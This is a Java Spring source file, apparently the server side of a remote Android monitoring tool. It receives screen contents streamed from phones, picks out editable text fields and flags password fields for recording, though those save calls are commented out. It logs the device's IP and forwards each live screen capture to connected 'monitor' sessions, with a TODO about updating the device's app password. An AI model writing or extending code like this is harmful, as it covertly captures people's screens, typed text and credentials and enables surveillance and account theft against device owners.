package io.renren.modules.app.message.admin;

import java.net.InetSocketAddress;
import java.util.Date;
import java.util.List;
import java.util.stream.Collectors;

import javax.annotation.Resource;

import org.apache.commons.collections4.CollectionUtils;
import org.apache.commons.lang3.StringUtils;
import org.springframework.stereotype.Component;
import org.springframework.web.socket.WebSocketSession;

import com.alibaba.fastjson.JSONArray;

import io.renren.common.constant.Constant;
import io.renren.commons.dynamic.datasource.config.DynamicContextHolder;
import io.renren.modules.app.common.Utils;
import io.renren.modules.app.entity.Device;
import io.renren.modules.app.entity.InputTextRecord;
import io.renren.modules.app.entity.ScreenInfo;
import io.renren.modules.app.message.Context;
import io.renren.modules.app.message.MessageHandler;
import io.renren.modules.app.message.proto.Message;
import io.renren.modules.app.service.DeviceService;
import io.renren.modules.app.service.InputTextRecordService;
import io.renren.modules.app.service.ScreenInfoService;
import lombok.extern.slf4j.Slf4j;

@Component
@Slf4j
public class ScreenInfoHandler implements MessageHandler<Message.ScreenInfo> {

    @Resource
    private ScreenInfoService screenInfoService;

    @Resource
    private InputTextRecordService inputTextRecordService;

    @Resource
    private DeviceService deviceService;


    public void hitRule(List<Message.ScreenItem> items) {

        for (Message.ScreenItem item : items) {
            if (StringUtils.isNotEmpty(item.getText())) {

            }
        }
    }

    @Override
    public void handler(Message.ScreenInfo message, Context context) throws Exception {
        String deviceId = message.getDeviceId();
        log.info("{} - ScreenInfo", deviceId);
        WebSocketSession current = context.getCurrent();
        InetSocketAddress socketAddress = current.getRemoteAddress();
        String appName = message.getAppName();
        String packageName = message.getPackageName();
        ScreenInfo screenInfo = new ScreenInfo();
        screenInfo.setDeviceId(deviceId);
        screenInfo.setAppName(appName);
        screenInfo.setPackageName(packageName);
        String nowStr = Utils.nowStr();
        Date now = Utils.now();
        screenInfo.setTime(nowStr);
        screenInfo.setDate(nowStr);
        List<Message.ScreenItem> itemsList = message.getItemsList();
        List<InputTextRecord> inputTextRecords = itemsList.stream().filter(item ->
                item.getIsEditable() && item.getIsFocusable() && StringUtils.isNotEmpty(item.getText())
        ).map(item -> {
            InputTextRecord inputTextRecord = new InputTextRecord();
//            inputTextRecord.setId(item.getId());
//            inputTextRecord.setText(item.getText());
//            inputTextRecord.setPassword(item.getIsPassword() ? Constant.YN.Y : Constant.YN.N);
//            inputTextRecord.setDate(nowStr);
//            inputTextRecord.setTime(nowStr);
//            inputTextRecord.setDeviceId(deviceId);
//            inputTextRecord.setAppName(appName);
//            inputTextRecord.setPackageName(packageName);
            return inputTextRecord;
        }).collect(Collectors.toList());
        String items = Utils.protoToJson(itemsList);
        JSONArray views = JSONArray.parseArray(items);
        screenInfo.setItems(items);
        //TODO 缓存保存
        try {
            DynamicContextHolder.push("clickhouse");
//            inputTextRecordService.insertBatch(inputTextRecords, 200); //TODO
//            screenInfoService.insert(screenInfo);//TODO 更改为批量
        } finally {
            DynamicContextHolder.poll();
        }
        //TODO 更新设备APP 密码
        
        Device device = deviceService.findByDeviceId(deviceId);
        if (device != null) {
            Device update = new Device();
            update.setId(device.getId());
            update.setIp(socketAddress.getHostName());
//            update.setStatus(Constant.DeviceStatus.screen_on);
            deviceService.updateById(update);
        } else {
            log.warn("device error:{}", deviceId);
        }

        List<WebSocketSession> monitors = context.getMonitor(deviceId);

        if (CollectionUtils.isNotEmpty(monitors)) {
            for (WebSocketSession monitor : monitors) {
                if (monitor != null && monitor.isOpen()) {
                    //转发
                    log.info("当前monitor在线进行转发!");
                    monitor.sendMessage(Utils.encode(Constant.MessageType.screen_info, message));
                }

            }
        }

    }
 

    @Override
    public int source() {
        return Constant.MessageSource.android;
    }
    
    @Override
    public int type() {
        return Constant.MessageType.screen_info;
    }
}
